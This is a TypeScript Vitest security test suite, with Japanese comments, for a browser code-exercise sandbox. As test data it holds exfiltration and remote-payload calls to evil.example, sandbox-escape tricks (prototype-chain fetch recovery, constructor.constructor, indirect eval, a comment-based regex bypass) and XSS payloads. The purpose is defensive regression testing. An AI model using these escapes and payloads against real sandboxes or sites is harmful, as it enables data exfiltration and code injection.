import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it, vi } from "vitest";
import { checkForbiddenTokens, runHarness } from "@/lib/runner/harness.worker";
import { runExercise, type WorkerLike } from "@/lib/runner/jsRunner";
import { ResultPanel } from "@/components/lab/ResultPanel";
import { getDemoExercise } from "@/lib/lab/demoExercise";
import type { RunRequest, RunResult } from "@/lib/contracts/runner";

/**
 * T-702 サンドボックス侵入テスト(docs/design/11_ADR-011「ADR-010」§3.1 SB-1〜SB-8)。
 *
 * 方法論(重要): このリポジトリのVitest環境(Node、jsdom不使用)は
 * `harness.worker.ts`の実運用ロード経路(`Blob URL経由のESM動的import`)を
 * 実行できない(Node/ViteのESMローダは`blob:`スキームを解決できず、内容に
 * 関わらず必ずrejectする。手動検証で確認済み)。そのため本ファイルは既存の
 * `tests/unit/runner/harness.worker.test.ts`と同じ手法を踏襲し、
 * `runHarness`の`deps.loadModule`に「攻撃コードのソーステキストが実際に
 * ロードされた場合に相当するJS」を注入して実行する。これにより
 * - 静的チェック(`checkForbiddenTokens`)は攻撃コードの**実際のソース文字列**に対して検証し、
 * - 実行時の防御(危険グローバル無効化・console捕捉・結果整形)は
 *   `runHarness`の**実コード**に対して検証する。
 * ロード手段(Blob URL経由import)自体の差し替えのみで、セキュリティ上の
 * 検証対象(静的チェック・グローバル無効化・postMessage契約・UI描画)は
 * すべて実装の実コードを通す。
 *
 * 本Vitest環境の限界上、以下はNode上のみでは証明できず実ブラウザでの検証が
 * 必須だったため、verify-webappスキル経由で`npm run preview`の実ブラウザ
 * (Chromium、Playwright)上で追加検証を行った。結果はdocs/security/findings.mdに
 * 詳細を記録し、要点のみここに残す:
 * - SB-1/SB-2 (CRITICAL, 実ブラウザで再現・突破を確認済み): 実ブラウザの
 *   dedicated WorkerではNodeと異なり`fetch`が`WorkerGlobalScope.prototype`上に
 *   存在するため、`Object.getPrototypeOf(self).fetch`および
 *   `self.constructor.prototype.fetch`は無効化後も**実際に呼び出し可能な
 *   関数**を返した。実際に`recoveredFetch.call(self, url)`で任意URLへの
 *   fetchを発行し、ブラウザのネットワークログに実リクエストが記録されることを
 *   確認した(`/ja/lab-preview`のclamp演習で実演)。同様に`new Worker(...)`に
 *   よるネストしたWorker生成も実ブラウザで成功した。Node環境(このファイルの
 *   他のテスト)ではglobalThisがfetchをown propertyとしてのみ持つため
 *   この経路は再現されず「防御が効く」という誤った結果になっていた —
 *   本ADR-010 §3.1が実ブラウザでの動的検証を必須としている理由そのもの。
 * - SB-6 (防御が効くことを実ブラウザで確認済み): `while(true){}`および
 *   巨大メモリ確保(`while(true){arr.push(new Array(1e6).fill(0))}`)の
 *   いずれも、ページ自体は最後まで操作可能なまま応答性を保ち、
 *   約5秒でjsRunner.tsの強制terminateにより「タイムアウトしました
 *   (強制停止)」表示に至ることを確認した。
 * - SB-7: `indexedDB`の実ブラウザWorkerでの到達性は今回未確認(時間の都合で
 *   verify-webapp検証の対象をSB-1/SB-2/SB-6に絞ったため)。spec上到達可能な
 *   ことは既知のため、Lowリスクとしてdocs/security/findings.mdに記録した。
 *
 * T-705追記(恒久対策・本ファイルの現状): 上記T-702で検出されたCritical/High項目は
 * 全てharness.worker.ts/jsRunner.tsの実装修正により防御済みになった。修正の要点:
 * - SB-1/SB-2/SB-4(Critical): `disableDangerousGlobals`をown property上書きから
 *   「globalThisのプロトタイプチェーン全体を走査し、対象キーが実際に定義されている
 *   階層を直接書き換える」方式へ全面改修(fetch/XMLHttpRequest/WebSocket/
 *   importScripts/Worker/indexedDB/eval/Functionが対象)。
 * - SB-3(Critical): 上記に加え、Function/GeneratorFunction/AsyncFunction/
 *   AsyncGeneratorFunctionの4関数系統の`prototype.constructor`バックリンクを
 *   ユーザーコード実行前に無効化することで、`[].constructor.constructor`のような
 *   識別子非依存の回避経路も閉じた。
 * - SB-5(High): `jsRunner.ts`の`worker.onmessage`に`RunResultSchema.safeParse`を
 *   配線し、契約違反の構造はerror RunResultへフォールバックするようにした。
 * 各テストは「攻撃が成立する」ことを固定する回帰テストから、「防御が成立する」
 * ことを検証するテストへ書き換えている(期待値の書き換えではなく実装修正が先)。
 * 詳細な修正内容の記録はdocs/security/findings.mdを参照。
 */

function baseRequest(overrides: Partial<RunRequest> = {}): RunRequest {
  return {
    code: "export function f() { return 1; }",
    entry: "f",
    tests: [],
    timeoutMs: 3000,
    ...overrides,
  };
}

// ============================================================
// SB-1: Worker内からfetch/XMLHttpRequest/importScripts/WebSocketへの到達不能性
// ============================================================
describe("SB-1: ネットワーク到達不能性(fetch/XHR/importScripts/WebSocket)", () => {
  it("防御が効く: 素直な呼び出し形は静的チェックで拒否される(fetch/XHR/importScripts)", async () => {
    const attacks = [
      'fetch("https://evil.example/exfiltrate");',
      'new XMLHttpRequest().open("GET", "https://evil.example");',
      'importScripts("https://evil.example/payload.js");',
    ];
    for (const code of attacks) {
      const staticError = checkForbiddenTokens(code);
      expect(staticError, `should statically reject: ${code}`).not.toBeNull();

      const loadModule = vi.fn();
      const result = await runHarness(baseRequest({ code: `${code}\nexport function f(){return 1;}` }), {
        loadModule,
      });
      expect(result.result).toBe("error");
      expect(loadModule, "module must never load once a forbidden token is detected").not.toHaveBeenCalled();
    }
  });

  it("防御が効く(T-705修正済み、findings.md Low #5対応): WebSocketは静的トークンリストにも追加され、かつ実行時にはself.WebSocketがundefinedに無効化されているため接続できない(多層防御)", async () => {
    // 修正前はFORBIDDEN_TOKEN_RULES(harness.worker.ts)にWebSocketの静的検出
    // ルールが存在せず、静的検出だけを見ると多層防御の1層が欠けていた
    // (実害はdisableDangerousGlobals側の無効化で防がれていたためLow)。
    // T-705でFORBIDDEN_TOKEN_RULESにWebSocketを追加し、静的層でも即座に拒否する。
    const code = 'const ws = new WebSocket("wss://evil.example"); export function f(){return 1;}';
    expect(checkForbiddenTokens(code)).not.toBeNull();

    const loadModule = vi.fn();
    const result = await runHarness(baseRequest({ code }), { loadModule });
    expect(result.result).toBe("error");
    expect(loadModule, "module must never load once a forbidden token is detected").not.toHaveBeenCalled();
  });

  it("防御が効く(多層防御の実行時層): 万一WebSocket構築が静的検出をすり抜けても、disableDangerousGlobals()によりself.WebSocketが呼び出し不能", async () => {
    const result = await runHarness(baseRequest({ tests: [{ id: "t1", args: [], expected: true }] }), {
      loadModule: async () => ({
        f: () => {
          const WS = (globalThis as Record<string, unknown>).WebSocket as
            | (new (url: string) => unknown)
            | undefined;
          if (typeof WS !== "undefined") return false;
          return true;
        },
      }),
    });
    expect(result.result).toBe("pass");
  });

  it("防御が効く: ブラケット表記/計算プロパティでfetch(の静的検出を回避しても、無効化により呼び出し不能", async () => {
    // FINDING(Low): `/\bfetch\s*\(/` は "fetch(" の直後一致を要求するため
    // `self['fetch'](...)` のようなブラケット表記は検出されない。
    // ただし disableDangerousGlobals() は `ctx.fetch = undefined` を
    // モジュール読み込み**前**に実行するため、ブラケット表記で参照しても
    // 得られる値はundefinedであり、実行時には防がれる。
    const code = 'const fn = self["fe"+"tch"]; export function f(){ return typeof fn; }';
    expect(checkForbiddenTokens(code)).toBeNull(); // 静的検出はすり抜ける

    const result = await runHarness(baseRequest({ code, tests: [{ id: "t1", args: [], expected: "undefined" }] }), {
      loadModule: async () => ({ f: () => typeof (globalThis as Record<string, unknown>)["fetch"] }),
    });
    expect(result.result).toBe("pass");
  });

  it("防御が効く(T-705修正済み、findings.md Critical #1対応): `new Worker(...)`は静的検出で拒否され、かつdisableDangerousGlobals()がWorker自体もプロトタイプチェーン走査で無効化する", async () => {
    const code = `
      const inner = new Worker(URL.createObjectURL(new Blob(["self['fe'+'tch']('https://evil.example/exfil')"], { type: "text/javascript" })));
      export function f(){ return 1; }
    `;
    // 修正前は"Worker"がFORBIDDEN_TOKEN_RULESに一切存在せず、ネストしたWorker
    // (disableDangerousGlobals()の対象外の新しいグローバルスコープを持つため
    // fetch等が有効な状態で生成できた)が静的検出を完全に回避していた
    // (実ブラウザで実演確認済み、docs/security/findings.md参照)。T-705で
    // FORBIDDEN_TOKEN_RULESに"new Worker"を追加し、静的層で即座に拒否する。
    expect(checkForbiddenTokens(code)).not.toBeNull();

    const loadModule = vi.fn();
    const result = await runHarness(baseRequest({ code }), { loadModule });
    expect(result.result).toBe("error");
    expect(loadModule, "module must never load once a forbidden token is detected").not.toHaveBeenCalled();
  });

  it("防御が効く(多層防御の実行時層): 万一Worker構築が静的検出をすり抜けても、disableDangerousGlobals()がWorkerを無効化し、実行後は元通り復元する", async () => {
    // Node環境にはグローバルWorkerが標準で存在しないため、own propertyとして
    // 一時的に模擬定義し、disableDangerousGlobals()の無効化/復元(DANGEROUS_GLOBAL_KEYS
    // にWorkerを含めたことによる保証)を実際に検証する。
    class FakeWorker {}
    (globalThis as Record<string, unknown>).Worker = FakeWorker;
    try {
      const result = await runHarness(baseRequest({ tests: [{ id: "t1", args: [], expected: true }] }), {
        loadModule: async () => ({
          f: () => typeof (globalThis as Record<string, unknown>).Worker === "undefined",
        }),
      });
      expect(result.result).toBe("pass");
      expect((globalThis as Record<string, unknown>).Worker).toBe(FakeWorker);
    } finally {
      delete (globalThis as Record<string, unknown>).Worker;
    }
  });
});

// ============================================================
// SB-2: self/globalThis経由での無効化API復元
// ============================================================
describe("SB-2: 無効化APIの復元不能性(prototype/constructor chain/Reflect)", () => {
  it("Node環境では復元できないが、これはNode固有の偶然でありFINDING(Critical, 未修正 — T-705送り): 実ブラウザでは同じ経路が実際にfetchを復元し、悪用可能である", async () => {
    // 重要な環境差、かつ本テストスイートの中で最も重要な注意点:
    // 実ブラウザのWorkerGlobalScopeでは`fetch`等はprototype(WorkerGlobalScope.prototype)
    // 経由で提供される仕様のため、`Object.getPrototypeOf(self).fetch`と
    // `self.constructor.prototype.fetch`は無効化後も**実際に呼び出し可能な関数**を
    // 返すことをverify-webapp(npm run preview、実Chromium、/ja/lab-previewのclamp演習)で
    // 確認済み。さらに`recoveredFetch.call(self, url)`で実際に任意URLへのfetchを
    // 発行し、ブラウザのネットワークログに実リクエストが記録されることまで確認した
    // (docs/security/findings.md参照)。
    // Node.jsのglobalThisは`fetch`をown property(configurable/writable)として直接持ち、
    // プロトタイプチェーンには存在しない(Object.getPrototypeOf(globalThis)はfetchを
    // 持たない)ため、以下のテストはNode環境では全て「復元できない(false)」という
    // 結果になる。これは防御が効いているのではなく、**Node環境がたまたま
    // WorkerGlobalScopeのprototype継承モデルを再現していないだけ**であり、
    // 実ブラウザでは全く逆の結果(復元できる)になることに注意。
    const result = await runHarness(
      {
        ...baseRequest(),
        tests: [
          { id: "getPrototypeOf", args: [], expected: false, fn: "viaGetPrototypeOf" },
          { id: "constructorChain", args: [], expected: false, fn: "viaConstructorChain" },
          { id: "reflectGet", args: [], expected: false, fn: "viaReflectGet" },
          { id: "ownDescriptorAfterDisable", args: [], expected: false, fn: "viaOwnDescriptor" },
        ],
      },
      {
        loadModule: async () => ({
          f: () => 1,
          viaGetPrototypeOf: () => typeof Object.getPrototypeOf(globalThis)?.fetch === "function",
          viaConstructorChain: () =>
            typeof (globalThis as unknown as { constructor: { prototype: { fetch?: unknown } } }).constructor
              ?.prototype?.fetch === "function",
          viaReflectGet: () => typeof Reflect.get(globalThis, "fetch") === "function",
          viaOwnDescriptor: () => {
            const descriptor = Object.getOwnPropertyDescriptor(globalThis, "fetch");
            return descriptor !== undefined && typeof descriptor.value === "function";
          },
        }),
      },
    );

    expect(result.result).toBe("pass");
    if (result.result === "pass" || result.result === "fail") {
      for (const t of result.perTest) {
        expect(t.pass, `${t.id} should not be able to recover fetch`).toBe(true);
      }
    }
  });

  it("防御が効く: 無効化されたグローバルはrunHarness完了後に復元されるが、サンドボックス実行中は一貫してundefinedのまま", async () => {
    const originalFetch = globalThis.fetch;
    const result = await runHarness(baseRequest({ tests: [{ id: "t1", args: [], expected: true }] }), {
      loadModule: async () => ({
        f: () =>
          typeof fetch === "undefined" &&
          typeof XMLHttpRequest === "undefined" &&
          typeof (globalThis as Record<string, unknown>).WebSocket === "undefined",
      }),
    });
    expect(result.result).toBe("pass");
    expect(globalThis.fetch).toBe(originalFetch);
  });
});

// ============================================================
// SB-3: new Function/eval経由でのサンドボックス外アクセス
// ============================================================
describe("SB-3: eval/Function経由の脱出", () => {
  it("防御が効く: 素直な eval(...) / new Function(...) は静的チェックで拒否される", () => {
    expect(checkForbiddenTokens('eval("1+1")')).not.toBeNull();
    expect(checkForbiddenTokens('new Function("return 1")')).not.toBeNull();
  });

  it("防御が効く(T-705修正済み、findings.md Critical #2対応): `Function(...)`をnew無しで呼び出す記法は静的チェックでも拒否される", () => {
    const sourceCode = `export function f() { const g = Function("return this"); return g() === globalThis; }`;
    // 修正前は"new"キーワードが存在しないため検出されなかった
    // (`/\bnew\s+Function\b/`のみだったため)。T-705でbare呼び出し`Function(`も
    // FORBIDDEN_TOKEN_RULESに追加した。
    expect(checkForbiddenTokens(sourceCode)).not.toBeNull();
  });

  it("防御が効く(多層防御の実行時層、根本対策): ブラケット表記+文字列結合で`Function`識別子への直接参照を避け静的検出をすり抜けても、Function自体がプロトタイプチェーン走査で無効化されているため呼び出し不能", async () => {
    // codeは"Function("という静的パターンを含まない難読化形にする
    // (self['Func'+'tion']のようなブラケット表記+文字列結合)。
    // 実行時: disableDangerousGlobals()がglobalThis.Function(Node上ではown property)を
    // undefinedへ書き換える(単純shadowingではなく実際の定義箇所を書き換えるため、
    // 復元不能)。したがってどの経路で参照しても`Function`はundefinedになる。
    const sourceCode = `export function f() { const g = (globalThis as Record<string, unknown>)["Func" + "tion"]; return typeof g; }`;
    expect(checkForbiddenTokens(sourceCode)).toBeNull(); // 難読化により静的検出をすり抜ける

    const result = await runHarness(
      baseRequest({ code: sourceCode, tests: [{ id: "t1", args: [], expected: "undefined" }] }),
      { loadModule: async () => ({ f: () => typeof (globalThis as Record<string, unknown>)["Func" + "tion"] }) },
    );
    expect(result.result).toBe("pass");
  });

  it("防御が効く(T-705修正済み、findings.md Critical #2対応): `[].constructor.constructor(...)`という直接的な記法は静的チェックでも拒否される", () => {
    const sourceCode = `export function f() { const F = [].constructor.constructor; return F("return 1+1")(); }`;
    expect(sourceCode).not.toContain("Function");
    expect(sourceCode).not.toContain("eval");
    // 修正前はソースコード中に'Function'・'eval'いずれの語も含まないためどの
    // ルールにも一致しなかった。T-705で`.constructor.constructor`という
    // 構造パターン自体を検出するルールを追加した。
    expect(checkForbiddenTokens(sourceCode)).not.toBeNull();
  });

  it("防御が効く(多層防御の実行時層、根本対策): ブラケット表記+変数化で`.constructor.constructor`の静的パターン一致を回避しても、Function.prototype.constructorのバックリンク自体を無効化しているためFunctionへ到達できない", async () => {
    // `[].constructor.constructor`のような`.constructor`アクセスは、あらゆる
    // 組み込みオブジェクト/関数の`.constructor`解決が最終的にたどり着く
    // `Function.prototype.constructor`(および同族のGeneratorFunction/
    // AsyncFunction/AsyncGeneratorFunctionのprototype.constructor)を
    // ユーザーコード実行前に無効化しておくことで、識別子やプロパティ名の
    // 難読化(ブラケット表記・文字列結合・変数経由)に関わらず一律に閉じる。
    const sourceCode = `export function f() { const c = "constructor"; const arrCtor = ([] as unknown as Record<string, unknown>)[c] as Record<string, unknown>; const F = arrCtor[c]; return typeof F; }`;
    expect(checkForbiddenTokens(sourceCode)).toBeNull(); // 構造上、静的パターンには一致しない(難読化成功)

    const result = await runHarness(
      { ...baseRequest(), code: sourceCode, tests: [{ id: "t1", args: [], expected: 2 }] },
      {
        loadModule: async () => ({
          f: () => {
            const c = "constructor";
            const arrCtor = ([] as unknown as Record<string, unknown>)[c] as Record<string, unknown>;
            const F = arrCtor[c] as ((...a: string[]) => () => number) | undefined;
            if (typeof F !== "function") return -1; // Functionへ到達できなかった(防御成功)
            return F("return 1+1")();
          },
        }),
      },
    );
    expect(result.result).toBe("fail");
    if (result.result === "pass" || result.result === "fail") {
      expect(result.perTest[0].actual).toBe("-1");
    }
  });

  it("防御が効く(T-705修正済み、findings.md Critical #2対応): 間接eval `(0, eval)(...)` の記法は静的チェックでも拒否される", () => {
    const sourceCode = `export function f() { const indirect = (0, eval); return indirect("this") === globalThis; }`;
    // 修正前は`/\beval\s*\(/`の直後一致のみだったため回避できた。T-705で
    // `(0, eval)`という間接eval特有の記法を検出するルールを追加した。
    expect(checkForbiddenTokens(sourceCode)).not.toBeNull();
  });

  it("防御が効く(多層防御の実行時層、根本対策): ブラケット表記+文字列結合で`eval`識別子への直接参照を避けても、eval自体がプロトタイプチェーン走査で無効化されているため呼び出し不能", async () => {
    const sourceCode = `export function f() { const e = (globalThis as Record<string, unknown>)["ev" + "al"]; return typeof e; }`;
    expect(checkForbiddenTokens(sourceCode)).toBeNull(); // ブラケット表記+文字列結合は静的パターンに一致しない

    const result = await runHarness(
      baseRequest({ code: sourceCode, tests: [{ id: "t1", args: [], expected: "undefined" }] }),
      { loadModule: async () => ({ f: () => typeof (globalThis as Record<string, unknown>)["ev" + "al"] }) },
    );
    expect(result.result).toBe("pass");
  });
});

// ============================================================
// SB-4: 動的import()での外部URL読み込み
// ============================================================
describe("SB-4: 動的import()による外部URL読み込み", () => {
  it("防御が効く(T-705修正済み、findings.md Critical #3対応): import()呼び出しは静的チェックで拒否される", () => {
    // `import(`は予約構文(識別子ではない)であり、`self['im'+'port']`のような
    // ブラケット表記・文字列結合による難読化が原理的に成立しない
    // (importはプロパティ参照ではなく専用の式構文のため)。したがって
    // リテラル一致の静的検出だけで完全に閉じられる、他の項目とは性質が異なる
    // 攻撃面。T-705でFORBIDDEN_TOKEN_RULESに追加した。
    const attacks = [
      'import("https://evil.example/payload.js")',
      "import('https://evil.example/payload.js').then(m => m.exfiltrate())",
      "import(x)",
    ];
    for (const code of attacks) {
      expect(checkForbiddenTokens(code), `import() must be statically rejected: ${code}`).not.toBeNull();
    }

    const loadModule = vi.fn();
    return runHarness(baseRequest({ code: attacks[0] }), { loadModule }).then((result) => {
      expect(result.result).toBe("error");
      expect(loadModule, "module must never load once a forbidden token is detected").not.toHaveBeenCalled();
    });
  });

  it("残存する既知の限界(正規表現ベース静的解析の限界。ネットワーク到達自体はT-704のCSPで解消済み): `import`とコンストラクタ呼び出しの間にブロックコメントを挟む難読化は、正規表現の`\\s*`がコメントを空白と見なさないためすり抜ける", () => {
    // これは`import()`という予約構文固有の弱点ではなく、regexベースの静的解析
    // 全般に共通する限界(AST解析ならコメントを無視して閉じられる)。この
    // 静的層自体は今も回避可能だが、ネットワーク到達性そのものの実効的な
    // 担保線はCSP(script-src 'self' blob:、_headers経由でscripts/
    // generate-worker-csp-headers.mjsが適用)がT-704で実装済みであり、
    // 実ブラウザ(npm run preview + Playwright)で外部URLへのimport()が
    // ブロックされることを確認した(tests/security/sandbox-escape-t705-repentest.test.ts
    // のSB-9参照)。
    const obfuscated = 'import/* comment */("https://evil.example/payload.js")';
    expect(checkForbiddenTokens(obfuscated)).toBeNull();
  });
});

// ============================================================
// SB-5: 不正な構造のpostMessageによるメインスレッド側パース処理の破壊
// ============================================================
describe("SB-5: postMessage契約破壊", () => {
  function fakeWorkerEchoing(forged: unknown): WorkerLike {
    const worker: WorkerLike = {
      postMessage: () => {
        // サンドボックス内のユーザーコードは self.postMessage(...) を直接
        // 呼び出せる(harness.worker.tsのcreateOnMessageHandlerはこれを
        // 遮断しない — ユーザーコードとharnessは同一のWorkerグローバルスコープを
        // 共有するため)。ここではその状況を再現する。
        worker.onmessage?.({ data: forged } as MessageEvent<RunResult>);
      },
      terminate: vi.fn(),
      onmessage: null,
      onerror: null,
    };
    return worker;
  }

  it("防御が効く(T-705修正済み、findings.md High #4対応): jsRunner.tsのworker.onmessageはRunResultSchemaでランタイム検証し、契約違反の構造はerror RunResultへ差し替えて返す", async () => {
    const forged = { result: "pass" }; // perTest/logs/durationMsが全て欠落した不正な構造
    const result = await runExercise(baseRequest(), { createWorker: () => fakeWorkerEchoing(forged) });
    // 修正前は本来のRunResultSchema(discriminatedUnion)によるバリデーションが
    // 一切存在せず、forgedがそのまま呼び出し元へ通過していた。T-705で
    // RunResultSchema.safeParseを配線し、失敗時は正しいRunResult形状の
    // errorへフォールバックするようにした(perTest/logs/durationMs欠落のまま
    // ResultPanelへ渡ることはなくなる)。
    expect(result).not.toEqual(forged);
    expect(result.result).toBe("error");
    if (result.result === "error") {
      expect(result.error.length).toBeGreaterThan(0);
      expect(result.logs).toEqual([]);
    }
  });

  it("防御が効く(多層防御、コンポーネント単体の頑健性は別問題): ResultPanelは契約違反データを直接渡されるとクラッシュするが、jsRunner.tsのSB-5修正によりこの経路には通常到達しない", () => {
    // ResultPanel自体はRunResultSchemaの整形済みデータを前提に実装されており、
    // 未検証データを直接渡せば依然としてクラッシュする(コンポーネント単体の
    // 契約は変更していない — 呼び出し元のjsRunner.tsが契約を満たすデータのみを
    // 渡す責務を担う設計)。この振る舞い自体は影響評定通りerror boundaryで
    // 緩和されるため独立してMedium〜Highに留め、実際の防御はjsRunner.ts側の
    // 検証(上のテスト)で行う。
    const exercise = getDemoExercise("ja");
    const forged = { result: "pass" } as unknown as RunResult;

    expect(() =>
      renderToStaticMarkup(
        createElement(ResultPanel, {
          status: "passed",
          result: forged,
          requestTests: [],
          exercise,
          activeTab: "tests",
          onTabChange: () => {},
          locale: "ja",
        }),
      ),
    ).toThrow();
  });
});

// ============================================================
// SB-6: 無限ループ・巨大メモリ確保時のterminateの確実性
// ============================================================
describe("SB-6: 無限ループ・メモリ枯渇に対するterminateの確実性", () => {
  it("防御が効く(メインスレッド側 jsRunner.ts): Workerが完全に応答不能(同期無限ループ)でも、外部の固定5秒タイムアウトで確実にterminateされる", async () => {
    vi.useFakeTimers();
    try {
      const terminate = vi.fn();
      const hangingWorker: WorkerLike = {
        postMessage: () => {
          // 攻撃コード相当: while(true){} により、このWorkerは二度とpostMessageしない
        },
        terminate,
        onmessage: null,
        onerror: null,
      };

      const promise = runExercise(baseRequest(), { createWorker: () => hangingWorker });
      await vi.advanceTimersByTimeAsync(5000);
      const result = await promise;

      expect(result).toEqual({ result: "timeout", logs: [], durationMs: 5000 });
      expect(terminate).toHaveBeenCalledTimes(1);
    } finally {
      vi.useRealTimers();
    }
  });

  it("防御が効く(実スレッド・実攻撃コード): node:worker_threadsで実際に同期無限ループを実行し、terminate()が確実に停止させることを確認する(ブラウザWorkerと同じ強制終了モデルの妥当性を実プロセスで裏付ける傍証)", async () => {
    const { Worker: ThreadWorker } = await import("node:worker_threads");
    const start = Date.now();
    const worker = new ThreadWorker("while(true){}", { eval: true });

    const terminated = await new Promise<{ elapsedMs: number }>((resolve, reject) => {
      const guard = setTimeout(
        () => reject(new Error("terminate() did not resolve within the test guard window")),
        4000,
      );
      const forceTerminate = setTimeout(() => {
        worker.terminate().then(() => {
          clearTimeout(guard);
          resolve({ elapsedMs: Date.now() - start });
        });
      }, 300);
      worker.once("error", () => clearTimeout(forceTerminate));
    });

    expect(terminated.elapsedMs).toBeLessThan(4000);
  }, 10_000);

  it("防御が効く(実スレッド・実攻撃コード): resourceLimitsを設定した実Workerで巨大メモリ確保を行うと、OS/OOMを待たずに短時間でエラー終了する(タイムアウトより先に自壊するケースがあることの実証。ブラウザには本APIと同等のresourceLimitsは存在せず、実挙動はverify-webappで別途確認が必要)", async () => {
    const { Worker: ThreadWorker } = await import("node:worker_threads");
    const start = Date.now();
    const worker = new ThreadWorker("const arr=[]; while(true){ arr.push(new Array(1e6).fill(0)); }", {
      eval: true,
      resourceLimits: { maxOldGenerationSizeMb: 64, maxYoungGenerationSizeMb: 16 },
    });

    const outcome = await new Promise<{ kind: "errored" | "forced"; elapsedMs: number }>((resolve) => {
      const guard = setTimeout(() => {
        worker.terminate().then(() => resolve({ kind: "forced", elapsedMs: Date.now() - start }));
      }, 4000);
      worker.once("error", () => {
        clearTimeout(guard);
        resolve({ kind: "errored", elapsedMs: Date.now() - start });
      });
    });

    expect(outcome.elapsedMs).toBeLessThan(4000);
  }, 10_000);
});

// ============================================================
// SB-7: Cookie/localStorage/IndexedDBへの到達不能性
// ============================================================
describe("SB-7: ストレージ到達不能性(Cookie/localStorage/IndexedDB)", () => {
  it("防御が効く(Node環境の傍証): document/localStorage/sessionStorageはWorkerグローバルスコープの仕様上そもそも存在しない(WorkerGlobalScopeのミックスインに含まれない)", async () => {
    const result = await runHarness(
      {
        ...baseRequest(),
        tests: [
          { id: "document", args: [], expected: true, fn: "noDocument" },
          { id: "localStorage", args: [], expected: true, fn: "noLocalStorage" },
        ],
      },
      {
        loadModule: async () => ({
          f: () => 1,
          noDocument: () => typeof (globalThis as Record<string, unknown>).document === "undefined",
          noLocalStorage: () => typeof (globalThis as Record<string, unknown>).localStorage === "undefined",
        }),
      },
    );
    expect(result.result).toBe("pass");
  });

  it("防御が効く(T-705修正済み、findings.md Low〜Medium #6対応): indexedDBは静的チェックでも拒否され、disableDangerousGlobals()の無効化対象にも追加された(ADR-010 §3.1の記述誤りの是正)", async () => {
    // 修正前はDedicated Workerに仕様上公開されるindexedDBが
    // disableDangerousGlobals()の無効化対象に含まれておらず(ADR-010の
    // 「IndexedDBへの到達不能性」という記述自体もWeb標準上誤りだった)、
    // FORBIDDEN_TOKEN_RULESにも存在しなかった。T-705でDANGEROUS_GLOBAL_KEYSと
    // FORBIDDEN_TOKEN_RULESの両方にindexedDBを追加した。
    expect(checkForbiddenTokens("indexedDB.open('x')")).not.toBeNull();

    // Node環境にもown propertyとして一時的に模擬定義し、実行時の無効化/復元を検証する
    // (Node環境にはindexedDBという概念自体が標準では存在しないため)。
    class FakeIndexedDB {}
    (globalThis as Record<string, unknown>).indexedDB = new FakeIndexedDB();
    const original = (globalThis as Record<string, unknown>).indexedDB;
    try {
      const result = await runHarness(baseRequest({ tests: [{ id: "t1", args: [], expected: true }] }), {
        loadModule: async () => ({
          f: () => typeof (globalThis as Record<string, unknown>).indexedDB === "undefined",
        }),
      });
      expect(result.result).toBe("pass");
      expect((globalThis as Record<string, unknown>).indexedDB).toBe(original);
    } finally {
      delete (globalThis as Record<string, unknown>).indexedDB;
    }
  });
});

// ============================================================
// SB-8: 結果メッセージ(console出力・diff表示)経由のXSS
// ============================================================
describe("SB-8: 結果表示経由のXSS", () => {
  const xssPayloads = [
    "<img src=x onerror=alert(document.cookie)>",
    "<script>alert(1)</script>",
    "javascript:alert(1)",
    '"><svg onload=alert(1)>',
  ];

  it("防御が効く: console出力(logs)に含まれるXSSペイロードは、ResultPanelがJSXテキストノードとして描画するためHTMLエスケープされ実行不能", () => {
    for (const payload of xssPayloads) {
      const html = renderToStaticMarkup(
        createElement(ResultPanel, {
          status: "passed",
          result: {
            result: "pass",
            perTest: [],
            logs: [{ level: "log", args: [payload] }],
            durationMs: 1,
          },
          requestTests: [],
          exercise: getDemoExercise("ja"),
          activeTab: "console",
          onTabChange: () => {},
          locale: "ja",
        }),
      );
      // 生のタグとして出力に含まれていないこと(エスケープされていること)を確認する。
      expect(html).not.toContain("<img src=x");
      expect(html).not.toContain("<script>alert(1)</script>");
      expect(html).not.toContain("<svg onload=alert(1)>");
    }
  });

  it("防御が効く: テスト失敗時のdiff/actual/error表示に含まれるXSSペイロードもエスケープされる", () => {
    const exercise = getDemoExercise("ja");
    const requestTests: RunRequest["tests"] = [{ id: "t1", args: [], expected: "safe-value" }];

    const html = renderToStaticMarkup(
      createElement(ResultPanel, {
        status: "failed",
        result: {
          result: "fail",
          perTest: [
            {
              id: "t1",
              pass: false,
              actual: JSON.stringify("<img src=x onerror=alert(1)>"),
              error: '<script>alert("from error field")</script>',
            },
          ],
          logs: [],
          durationMs: 1,
        },
        requestTests,
        exercise,
        activeTab: "tests",
        onTabChange: () => {},
        locale: "ja",
      }),
    );

    expect(html).not.toContain("<img src=x onerror=alert(1)>");
    expect(html).not.toContain('<script>alert("from error field")</script>');
  });
});
